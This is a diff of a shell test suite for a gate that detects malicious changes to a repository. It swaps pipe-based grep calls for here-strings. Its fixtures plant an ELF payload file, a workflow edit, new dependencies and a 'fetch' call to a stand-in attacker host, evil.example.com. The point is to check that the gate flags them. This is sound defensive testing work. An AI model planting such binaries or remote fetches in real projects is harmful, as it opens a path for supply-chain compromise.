@@ -39,7 +39,7 @@ bad() {
 	fail=$((fail + 1))
 }
 # has REGEX / hasnt REGEX — grep the last captured $out. Same vocabulary as verify_test.sh.
-has() { printf '%s' "${out:-}" | grep -qE -- "$1"; }
+has() { grep -qE -- "$1" <<<"${out:-}"; }
 hasnt() { ! has "$1"; }
 
 echo "== malicious-change gate =="
@@ -108,7 +108,7 @@ run_case() {
 
 plant_binary() { printf '\x7fELF\x02\x01\x01\x00\x00\x00' > src/payload.dat; }
 run_case "binary file added outside assets/ blocks" 1 plant_binary
-printf '%s' "$out" | grep -q 'binary file added' || bad "  ...and names the finding"
+grep -q 'binary file added' <<<"$out" || bad "  ...and names the finding"
 
 plant_exec() {
 	printf 'data\n' > src/notascript
@@ -154,25 +154,25 @@ run_case "oversized file added blocks" 1 plant_big
 # header alone is still "text" to it and the binary branch never runs.
 plant_asset_binary() { printf '\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00' > assets/pic.png; }
 run_case "binary under assets/ warns but does not block" 0 plant_asset_binary
-printf '%s' "$out" | grep -q 'allowed directory' \
+grep -q 'allowed directory' <<<"$out" \
 	&& ok "  ...and says why it was allowed" \
 	|| bad "  ...and says why it was allowed"
 
 plant_workflow() { printf 'name: y\non: push\n' > .github/workflows/y.yml; }
 run_case "workflow edit warns but does not block" 0 plant_workflow
-printf '%s' "$out" | grep -q 'workflow changed' \
+grep -q 'workflow changed' <<<"$out" \
 	&& ok "  ...and flags the token scope for review" \
 	|| bad "  ...and flags the token scope for review"
 
 plant_dep() { printf '%s' '{"name":"t","dependencies":{"left-pad":"1.0.0","chalk":"5.0.0"}}' > tools/tui/package.json; }
 run_case "new dependency warns but does not block" 0 plant_dep
-printf '%s' "$out" | grep -q 'dependency manifest changed' \
+grep -q 'dependency manifest changed' <<<"$out" \
 	&& ok "  ...and names the manifest" \
 	|| bad "  ...and names the manifest"
 
 plant_url() { printf 'fetch("https://evil.example.com/x")\n' > src/f.js; }
 run_case "new remote URL warns but does not block" 0 plant_url
-printf '%s' "$out" | grep -q 'new remote URL' \
+grep -q 'new remote URL' <<<"$out" \
 	&& ok "  ...and lists the URL" \
 	|| bad "  ...and lists the URL"
 
@@ -184,7 +184,7 @@ run_case "executable *.sh is normal, no finding" 0 plant_script
 
 plant_source() { printf 'int b(void){return 1;}\n' > src/b.c; }
 run_case "ordinary source addition is clean" 0 plant_source
-printf '%s' "$out" | grep -q 'clean' \
+grep -q 'clean' <<<"$out" \
 	&& ok "  ...and reports clean" \
 	|| bad "  ...and reports clean"
 
